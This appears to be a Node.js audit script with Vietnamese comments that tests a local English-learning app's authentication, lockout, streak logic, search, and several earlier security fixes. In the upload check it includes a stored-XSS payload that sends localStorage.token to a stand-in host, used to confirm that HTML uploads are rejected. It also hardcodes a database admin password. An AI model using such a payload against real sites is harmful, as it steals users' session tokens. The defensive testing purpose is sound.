/**
 * audit-v8 vòng 3 — đóng các gap vòng 1/2 chưa phủ bằng bằng chứng sống:
 *   A. Đăng ký / đăng nhập / lockout   (goal: "Đăng nhập/Đăng kí")
 *   B. Cơ chế streak (user tạm + DB thật)  (goal: "Cơ chế streak")
 *   C. Tìm kiếm / sắp xếp               (goal: "Tìm kiếm/sắp xếp")
 *   D. Tái xác minh F81/F83/F86 + đo lại admin list
 * Mọi row/file tạo ra đều bị xóa ở SEC. CLEANUP. Chạy: node p5.js
 *
 * Section B đã được viết lại theo hợp đồng streak mới (audit-v10): chỉ hoạt động
 * học THẬT (SRS review) mới ghi ngày học, đăng nhập KHÔNG ghi. Hai cột
 * users.current_streak / last_study_date đã write-dead, không còn được assert.
 * Cleanup xoá study_days TRƯỚC users vì FK fk_study_days_user là NO_ACTION.
 */
const lib = require("./lib.js");
const { probe } = lib;
const { execFileSync } = require("child_process");

const BASE = "http://localhost:8080";
const STAMP = Date.now().toString().slice(-8);
const EMAIL = "zzv3" + STAMP + "@example.com";
const USERNAME = "zzv3" + STAMP;
const PASS = "Test123456";
let userRowId = null, orderCode = null, uploadedUrl = null, tempTok = null;

function sql(q) {
  return execFileSync("docker", ["exec", "engflow-sqlserver", "/opt/mssql-tools18/bin/sqlcmd",
    "-S", "localhost", "-U", "sa", "-P", "YourPassword123", "-d", "english_learning",
    "-C", "-I", "-h", "-1", "-W", "-Q", "SET QUOTED_IDENTIFIER ON; SET NOCOUNT ON; " + q], { encoding: "utf8" }).trim();
}
function redis(...a) { return execFileSync("docker", ["exec", "engflow-redis", "redis-cli", ...a], { encoding: "utf8" }).trim(); }
function sh(cmd) { return execFileSync("docker", ["exec", "engflow-backend", "sh", "-c", cmd], { encoding: "utf8" }).trim(); }
const vnToday = () => new Date(Date.now() + 7 * 3600e3).toISOString().slice(0, 10);

let pass = 0, fail = 0;
function note(name, got, want, extra) {
  const ok = String(got) === String(want);
  ok ? pass++ : fail++;
  lib.rows.push({ name: name, method: "-", path: "-", as: "-", code: ok ? 200 : 599, ms: 0,
    expect: String(want), pass: ok, snippet: "got=" + got + (extra ? " :: " + String(extra).slice(0, 200) : "") });
  console.log((ok ? "  OK   " : "  FAIL ") + name + " | got=" + got + " want=" + want +
    (extra !== undefined ? " | " + String(extra).slice(0, 130) : ""));
}
async function api(method, path, token, body) {
  const headers = {};
  if (token) headers.Authorization = "Bearer " + token;
  if (body !== undefined) headers["Content-Type"] = "application/json";
  const t0 = Date.now();
  const r = await fetch(BASE + path, { method, headers, body: body === undefined ? undefined : JSON.stringify(body) });
  const txt = await r.text();
  return { code: r.status, txt, ms: Date.now() - t0 };
}
function probeT(name, method, path, expect, body) {
  return api(method, path, tempTok, body).then(r => {
    const ok = (Array.isArray(expect) ? expect : [expect]).includes(r.code);
    lib.rows.push({ name: name, method: method, path: path, as: "temp-user", code: r.code, ms: r.ms,
      expect: String(expect), pass: ok, snippet: r.txt.slice(0, 200) });
    return r;
  });
}
let uploadsAtStart = null;
async function login(email, password) {
  const r = await api("POST", "/api/auth/login", null, { email, password });
  let tok = null; try { const j = JSON.parse(r.txt); tok = (j.data && j.data.token) || j.token; } catch (e) {}
  return { code: r.code, tok, txt: r.txt };
}

(async () => {
  await lib.initTokens();
  lib.flushLimits(true);
  uploadsAtStart = sh("ls -1 /app/uploads 2>/dev/null").split(/\r?\n/).filter(Boolean).length;
  console.log("uploads/ baseline =", uploadsAtStart);

  console.log("=== A. ĐĂNG KÝ / ĐĂNG NHẬP / LOCKOUT ===");
  let r = await probe("register valid", "POST", "/api/auth/register", "none", 201,
    { username: USERNAME, email: EMAIL, password: PASS, fullName: "ZZ v3" });
  note("register -> 201", r.code, 201, r.txt.slice(0, 110));
  try { const j = JSON.parse(r.txt); tempTok = (j.data && j.data.token) || j.token; } catch (e) {}
  note("register tự đăng nhập (trả token)", !!tempTok, "true");
  userRowId = sql("SELECT user_id FROM users WHERE email = '" + EMAIL + "'");
  note("đọc được user_id từ DB", /^[0-9]+$/.test(userRowId), "true", "user_id=" + userRowId);

  r = await probe("register dup email", "POST", "/api/auth/register", "none", 409,
    { username: USERNAME + "x", email: EMAIL, password: PASS, fullName: "dup" });
  note("email trùng -> 409", r.code, 409, r.txt.slice(0, 90));
  r = await probe("register dup username", "POST", "/api/auth/register", "none", 409,
    { username: USERNAME, email: "zzv3b" + STAMP + "@example.com", password: PASS, fullName: "dup" });
  note("username trùng -> 409", r.code, 409, r.txt.slice(0, 90));
  r = await probe("register email sai định dạng", "POST", "/api/auth/register", "none", 400,
    { username: USERNAME + "a", email: "not-an-email", password: PASS });
  note("email sai định dạng -> 400", r.code, 400, r.txt.slice(0, 90));
  r = await probe("register password ngắn", "POST", "/api/auth/register", "none", 400,
    { username: USERNAME + "b", email: "zzv3c" + STAMP + "@example.com", password: "123" });
  note("password < 6 ký tự -> 400", r.code, 400, r.txt.slice(0, 90));
  r = await probe("register username ngắn", "POST", "/api/auth/register", "none", 400,
    { username: "ab", email: "zzv3d" + STAMP + "@example.com", password: PASS });
  note("username < 3 ký tự -> 400", r.code, 400, r.txt.slice(0, 90));

  r = await probe("me noauth", "GET", "/api/auth/me", "none", 401);
  note("/api/auth/me không token -> 401", r.code, 401);
  note("me (token tạm) -> 200 + email đúng",
    JSON.stringify(await probeT("me temp user", "GET", "/api/auth/me", 200).then(x => JSON.parse(x.txt).email)) === JSON.stringify(EMAIL),
    "true");

  r = await probe("login wrong pw", "POST", "/api/auth/login", "none", 401, { email: EMAIL, password: "WrongPass999" });
  note("mật khẩu sai -> 401", r.code, 401, r.txt.slice(0, 80));
  note("login_fail counter = 1", redis("get", "login_fail:" + EMAIL), "1");
  const l1 = await login(EMAIL, PASS);
  note("đăng nhập đúng -> 200 + token", l1.code + "/" + !!l1.tok, "200/true");
  note("login_fail reset sau thành công", redis("get", "login_fail:" + EMAIL), "");

  lib.flushLimits(true);
  for (let i = 1; i <= 5; i++) await login(EMAIL, "WrongPass999");
  note("sau 5 lần sai: login_lock key tồn tại", redis("exists", "login_lock:" + EMAIL), "1");
  const ttl = Number(redis("ttl", "login_lock:" + EMAIL));
  note("TTL khoá trong khoảng 13–15 phút", ttl > 780 && ttl <= 900, "true", "ttl=" + ttl + "s");
  const locked = await login(EMAIL, PASS);
  note("đang khoá: mật khẩu ĐÚNG -> 400", locked.code, 400, locked.txt.slice(0, 130));
  redis("del", "login_lock:" + EMAIL, "login_fail:" + EMAIL);
  const l2 = await login(EMAIL, PASS);
  note("xóa khoá xong -> đăng nhập lại 200", l2.code, 200);
  tempTok = l2.tok;

  console.log("=== B. CƠ CHẾ STREAK (user tạm + DB thật) ===");
  lib.flushLimits(true);

  // Hợp đồng mới (audit-v10): chỉ hoạt động học THẬT mới ghi ngày học, không phải
  // đăng nhập. Khẳng định này bằng dữ liệu, không bằng đọc code.
  r = await probeT("streak snapshot sau đăng nhập", "GET", "/api/streak/snapshot", 200);
  let j = {}; try { j = JSON.parse(r.txt); } catch (e) {}
  note("đăng nhập KHÔNG tạo ngày học -> currentStreak 0", j.currentStreak, 0, JSON.stringify(j));
  note("today = ngày server VN", j.today, vnToday(), JSON.stringify(j));
  note("studiedToday = false (chỉ đăng nhập)", j.studiedToday, false, JSON.stringify(j));
  note("study_days rỗng sau đăng nhập", sql("SELECT COUNT(*) FROM study_days WHERE user_id = " + userRowId), "0");

  // Một hoạt động học thật (SRS review) phải ghi đúng MỘT ngày học — không nhân đôi
  // dù review lại cùng từ (unique index uq_study_days_user_date giữ).
  const vocabId = sql("SELECT TOP 1 vocab_id FROM vocabulary ORDER BY vocab_id");
  note("lấy được vocabId thật để review", /^[0-9]+$/.test(vocabId), "true", "vocabId=" + vocabId);
  r = await probeT("SRS review -> 200", "POST", "/api/srs/review", 200, { vocabId: Number(vocabId), quality: 5 });
  note("SRS review ghi 1 ngày học", sql("SELECT COUNT(*) FROM study_days WHERE user_id = " + userRowId + " AND study_date = '" + vnToday() + "'"), "1");
  r = await probeT("SRS review lại (cùng ngày)", "POST", "/api/srs/review", 200, { vocabId: Number(vocabId), quality: 4 });
  note("review lại KHÔNG nhân đôi (unique index)", sql("SELECT COUNT(*) FROM study_days WHERE user_id = " + userRowId), "1");

  // Snapshot phải phản ánh đúng sự thật vừa ghi.
  r = await probeT("snapshot sau khi học", "GET", "/api/streak/snapshot", 200);
  try { j = JSON.parse(r.txt); } catch (e) {}
  note("studiedToday = true sau khi học", j.studiedToday, true, JSON.stringify(j));
  note("currentStreak = 1 sau khi học", j.currentStreak, 1, JSON.stringify(j));
  note("studiedDays chứa hôm nay", Array.isArray(j.studiedDays) && j.studiedDays.includes(vnToday()), "true", JSON.stringify(j.studiedDays));

  // Bỏ trọn 1 ngày (gỡ ngày hôm nay) phải reset streak về 0 — luật Duolingo.
  sql("DELETE FROM study_days WHERE user_id = " + userRowId);
  r = await probeT("snapshot sau khi xoá hết ngày học", "GET", "/api/streak/snapshot", 200);
  try { j = JSON.parse(r.txt); } catch (e) {}
  note("xoá hết ngày học -> streak 0", j.currentStreak, 0, JSON.stringify(j));

  // audit-v13 F-13-08: users.current_streak/last_study_date đã bị XOÁ khỏi schema (chúng
  // write-dead từ lâu). Streak thật đọc từ study_days — assert đúng nguồn đó.
  note("xoá hết study_days -> DB không còn ngày học nào", sql("SELECT COUNT(*) FROM study_days WHERE user_id = " + userRowId), "0");
  r = await probe("streak history noauth", "GET", "/api/streak/history", "none", 401);
  note("streak cần đăng nhập -> 401", r.code, 401);

  console.log("=== C. TÌM KIẾM / SẮP XẾP ===");
  r = await probe("lessons page", "GET", "/api/lessons?page=0&size=100", "none", 200);
  const all = JSON.parse(r.txt); const total = all.totalElements; const content = all.content || [];
  note("lesson list có page + totalElements", total > 0 && content.length > 0, "true", "total=" + total + " rows=" + content.length);
  note("sort mặc định orderIndex tăng dần", content.every((x, i) => i === 0 || content[i - 1].orderIndex <= x.orderIndex), "true");

  const first = content.find(x => x.title && x.title.split(/\s+/).length > 2) || {};
  const word = (first.title || "English").split(/\s+/).find(w => w.length > 4) || "English";
  r = await probe("lessons q=" + word, "GET", "/api/lessons?q=" + encodeURIComponent(word) + "&size=100", "none", 200);
  const sr = JSON.parse(r.txt); const hits = sr.content || [];
  note("search q lọc đúng (row nào cũng khớp title/description/category)",
    hits.length > 0 && hits.every(x => ((x.title || "") + " " + (x.description || "") + " " + (x.category || "")).toLowerCase().includes(word.toLowerCase())),
    "true", "term=" + word + " hits=" + hits.length + " total=" + sr.totalElements);
  note("search thu hẹp kết quả", sr.totalElements < total, "true", sr.totalElements + " < " + total);

  r = await probe("lessons level=ELEMENTARY", "GET", "/api/lessons?level=ELEMENTARY&size=100", "none", 200);
  const lv = JSON.parse(r.txt);
  note("filter level đúng", (lv.content || []).length > 0 && lv.content.every(x => x.level === "ELEMENTARY"), "true",
    "rows=" + (lv.content || []).length + " total=" + lv.totalElements);
  note("filter level thu hẹp kết quả", lv.totalElements < total, "true", lv.totalElements + " < " + total);

  r = await probe("lessons q không khớp", "GET", "/api/lessons?q=zzzznopezzzz", "none", 200);
  note("search không khớp -> 0 row", JSON.parse(r.txt).totalElements, 0);

  r = await probe("vocab list noauth", "GET", "/api/vocabulary?size=5", "none", 401);
  note("vocab list cần đăng nhập (SecurityConfig anyRequest authenticated) -> 401", r.code, 401);
  r = await probe("vocab list as user", "GET", "/api/vocabulary?size=5", "user", 200);
  const vlist = JSON.parse(r.txt);
  note("vocab list (có token) -> 200 + 5 row", r.code === 200 && (vlist.content || []).length === 5, "true",
    "rows=" + (vlist.content || []).length);
  const vw = ((vlist.content || [])[0] || {}).word || "";
  const frag = vw.slice(0, Math.max(2, Math.floor(vw.length / 2)));
  r = await probe("vocab search fragment=" + frag, "GET", "/api/vocabulary/search?keyword=" + encodeURIComponent(frag), "none", 200);
  const vocab = JSON.parse(r.txt);
  note("vocab search khớp fragment (case-insensitive)",
    vocab.length > 0 && vocab.every(v => v.word.toLowerCase().includes(frag.toLowerCase())), "true",
    "rows=" + vocab.length + " frag=" + frag + " first=" + (vocab[0] || {}).word);
  note("vocab list sort mặc định theo word", (vlist.content || []).every((x, i) => i === 0 ||
    vlist.content[i - 1].word.toLowerCase() <= x.word.toLowerCase()), "true");
  r = await probe("vocab search 1 ký tự", "GET", "/api/vocabulary/search?keyword=t", "none", 200);
  note("keyword < 2 ký tự -> []", r.txt.replace(/\s/g, ""), "[]");

  let bestMs = 1e9, ae = null;
  for (let i = 0; i < 3; i++) {
    r = await probe("admin exercises q (lần " + (i + 1) + ")", "GET", "/api/admin/exercises?q=the&size=20", "admin", 200);
    ae = JSON.parse(r.txt); bestMs = Math.min(bestMs, r.ms);
  }
  note("admin q lọc đúng (question hoặc explanation chứa 'the')", (ae.content || []).length > 0 &&
    ae.content.every(x => ((x.question || "") + " " + (x.explanation || "")).toLowerCase().includes("the")), "true",
    "rows=" + (ae.content || []).length);
  note("admin q: lessonTitle đủ 20/20 row", (ae.content || []).length === 20 && ae.content.every(x => !!x.lessonTitle), "true");
  note("admin q: trang 20 row < 300ms (min 3 lần)", bestMs < 300, "true", "min=" + bestMs + "ms");
  r = await probe("admin exercises type+difficulty", "GET", "/api/admin/exercises?type=MULTIPLE_CHOICE&difficulty=EASY&size=5", "admin", 200);
  const af = JSON.parse(r.txt);
  note("filter type+difficulty đúng", (af.content || []).length > 0 &&
    af.content.every(x => x.exerciseType === "MULTIPLE_CHOICE" && x.difficulty === "EASY"), "true",
    "rows=" + (af.content || []).length + " ms=" + r.ms);
  r = await probe("admin exercises type không hợp lệ", "GET", "/api/admin/exercises?type=ZZZZ&size=5", "admin", 400);
  note("type không hợp lệ -> 400 (validate enum)", r.code, 400, r.txt.slice(0, 80));

  console.log("=== D. TÁI XÁC MINH FIX ===");
  r = await probe("F86 topic rỗng", "POST", "/api/v1/admin/speaking-prompts/ai-generate", "admin", 400, { topic: "" });
  note("F86: topic rỗng -> 400, không gọi Ollama", r.code === 400 && r.ms < 1500, "true", r.ms + "ms " + r.txt.slice(0, 70));
  r = await probe("F86 topic khoảng trắng", "POST", "/api/v1/admin/speaking-prompts/ai-generate", "admin", 400, { topic: "   " });
  note("F86: topic khoảng trắng -> 400", r.code, 400, r.ms + "ms");

  async function mpUpload(fileName, ctype, buf) {
    const b = "----zz" + Math.random().toString(16).slice(2);
    const parts = [Buffer.from("--" + b + "\r\nContent-Disposition: form-data; name=\"file\"; filename=\"" + fileName + "\"\r\nContent-Type: " + ctype + "\r\n\r\n"),
      buf, Buffer.from("\r\n--" + b + "--\r\n")];
    const resp = await fetch(BASE + "/api/admin/upload", { method: "POST",
      headers: { "Content-Type": "multipart/form-data; boundary=" + b, Authorization: "Bearer " + lib.getAdmin() },
      body: Buffer.concat(parts) });
    return { code: resp.status, txt: await resp.text() };
  }
  let up = await mpUpload("evil3.html", "text/html", Buffer.from("<script>fetch('//x/'+localStorage.token)</script>"));
  lib.rows.push({ name: "F81 upload .html", method: "POST", path: "/api/admin/upload", as: "admin", code: up.code,
    ms: 0, expect: "400", pass: up.code === 400, snippet: up.txt.slice(0, 160) });
  note("F81: upload .html -> 400", up.code, 400, up.txt.slice(0, 100));
  const png = Buffer.from("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6300010000050001", "hex");
  up = await mpUpload("ok3.png", "image/png", png);
  lib.rows.push({ name: "F81 upload .png", method: "POST", path: "/api/admin/upload", as: "admin", code: up.code,
    ms: 0, expect: "200", pass: up.code === 200, snippet: up.txt.slice(0, 160) });
  note("F81: upload .png vẫn 200", up.code, 200, up.txt.slice(0, 100));
  try { uploadedUrl = JSON.parse(up.txt).url; } catch (e) {}
  if (uploadedUrl) {
    const s = await fetch(BASE + uploadedUrl);
    const ct = s.headers.get("content-type") || "";
    const cd = s.headers.get("content-disposition") || "";
    lib.rows.push({ name: "F81 serve file vừa upload", method: "GET", path: uploadedUrl, as: "none", code: s.status,
      ms: 0, expect: "200", pass: s.status === 200, snippet: "content-type=" + ct + " disposition=" + cd });
    note("F81: trả đúng Content-Type ảnh, không phải html", s.status === 200 && /image\/png/.test(ct), "true",
      "content-type=" + ct + " disposition=" + cd);
  }
  r = await probe("F83 route create-order", "POST", "/api/v1/payment/create-order", "user", 200, { planType: "MONTH" });
  try { orderCode = JSON.parse(r.txt).orderCode || JSON.parse(r.txt).order_code; } catch (e) {}
  note("F83: /api/v1/payment/create-order -> 200 + orderCode", r.code === 200 && !!orderCode, "true",
    r.code + " orderCode=" + orderCode);

  console.log("=== CLEANUP ===");
  if (uploadedUrl) { sh("rm -f /app/uploads/" + uploadedUrl.split("/").pop()); console.log("  xóa file probe upload"); }
  const after = sh("ls -1 /app/uploads 2>/dev/null").split(/\r?\n/).filter(Boolean);
  note("uploads/ về đúng baseline đầu phiên", after.length, uploadsAtStart, "after=" + after.join(","));
  if (orderCode) { sql("DELETE FROM payment_transactions WHERE order_code = '" + orderCode + "'"); console.log("  xóa payment probe", orderCode); }
  // FK fk_study_days_user + user_vocabulary_progress đều NO_ACTION: xoá users mà
  // còn row con sẽ lỗi Msg 547. Section B giờ gọi /api/srs/review → tạo
  // user_vocabulary_progress, nên phải xoá cả hai bảng con TRƯỚC users. Dùng
  // LIKE 'zzv3%' để dọn cả user từ lần chạy trước bị kẹt, không chỉ userRowId.
  sql("DELETE FROM user_vocabulary_progress WHERE user_id IN (SELECT user_id FROM users WHERE email LIKE 'zzv3%')");
  sql("DELETE FROM study_days WHERE user_id IN (SELECT user_id FROM users WHERE email LIKE 'zzv3%')");
  sql("DELETE FROM users WHERE email LIKE 'zzv3%'");
  redis("del", "login_lock:" + EMAIL, "login_fail:" + EMAIL);
  note("user tạm đã xóa khỏi DB", sql("SELECT COUNT(*) FROM users WHERE email LIKE 'zzv3%'"), "0");
  note("study_days đã xóa sạch", sql("SELECT COUNT(*) FROM study_days WHERE user_id = " + userRowId), "0");
  note("payment probe đã xóa", orderCode ? sql("SELECT COUNT(*) FROM payment_transactions WHERE order_code = '" + orderCode + "'") : "0", "0");

  lib.report("audit-v8 vòng 3 (auth + streak + search/sort + re-verify)");
  lib.dump("p5.json");
  console.log("ASSERT PASS=" + pass + " FAIL=" + fail);
})().catch(e => { console.error("FATAL", e); process.exit(1); });
